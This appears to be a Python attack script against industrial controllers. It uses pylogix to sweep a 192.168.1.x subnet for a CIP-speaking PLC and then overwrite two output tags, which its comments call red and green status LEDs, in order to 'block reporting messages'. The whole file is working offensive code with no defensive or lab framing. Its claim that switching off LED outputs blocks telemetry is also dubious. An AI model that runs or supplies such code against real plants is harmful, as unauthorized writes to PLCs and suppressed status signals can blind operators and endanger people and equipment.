from pylogix import PLC
import socket

def find_plc_ip(network_prefix):
    """
    Scan IP addresses within a subnet to discover the PLC's IP.
    Assumes the PLC is using the Common Industrial Protocol (CIP).
    """
    for i in range(1, 255):
        ip = f"{network_prefix}.{i}"
        try:
            comm = PLC()
            comm.IPAddress = ip
            response = comm.GetTagList()
            if response.Value:
                print(f"[+] PLC Found at {ip}")
                return ip
        except:
            pass
    print("[-] No PLC found in the given subnet.")
    return None

def block_reporting_messages(plc_ip):
    """
    Connects to the PLC and disrupts reporting messages by modifying relevant tags.
    """
    comm = PLC()
    comm.IPAddress = plc_ip
    
    print(f"[+] Connecting to PLC at {plc_ip}...")

    # Identify variables used for system status reporting
    status_tags = ["_IO_EM_DO_06", "_IO_EM_DO_07"]  # Red and Green LED output statuses

    # Override their values to "do nothing"
    for tag in status_tags:
        response = comm.Write(tag, False)  # Block reporting by keeping them off
        if response.Status == "Success":
            print(f"[+] Successfully blocked telemetry for {tag}")
        else:
            print(f"[-] Failed to modify {tag}")
    
    print("[+] Reporting messages have been blocked.")

def main():
    """
    Finds the PLC IP and blocks telemetry messages.
    """
    network_prefix = "192.168.1"  # Change based on actual PLC network range
    plc_ip = find_plc_ip(network_prefix)

    if plc_ip:
        block_reporting_messages(plc_ip)
    else:
        print("[-] Could not locate PLC.")

if __name__ == "__main__":
    main()